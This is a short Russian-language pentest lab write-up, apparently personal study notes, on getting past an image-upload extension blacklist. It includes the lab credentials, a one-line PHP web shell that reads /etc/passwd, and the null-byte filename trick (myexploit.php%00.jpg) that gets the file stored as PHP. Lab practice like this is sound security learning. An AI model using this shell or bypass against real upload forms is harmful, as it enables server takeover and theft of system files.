Лаборатория содержит уязвимую функцию загрузки изображений. Некоторые расширения файлов занесены в черный список, но эту защиту можно обойти с помощью классической техники [[Pentest/Термины#Обфускация|обфускации]].

## Дано

учетные данные: `wiener:peter`

## Задача

загрузить базовую веб-оболочку PHP, а затем использовать ее для извлечения содержимого файла. `/home/carlos/secret`

# Разведка

- проверка расширения `application/x-httpd-php` - 200
- расширение .php .php4 - `Sorry, only JPG & PNG files are allowed`
- `<?php echo file_get_contents('/etc/passwd'); ?>`
- Пробуем сделать обфускацию
	Несколько расширений; Добавить конечные символы;  Кодировка URL-адреса; Точки с запятой или нулевые байтовые символы; Многобайтовые символы Юникода.

myexploit.php.jpg - ответ 200 

# Атака

- myexploit.php.jpg - вариант убрать .jpg
	`#`  `кодировка` `%00` 

myexploit.php%00.jpg - The file avatars/myexploit.php has been uploaded


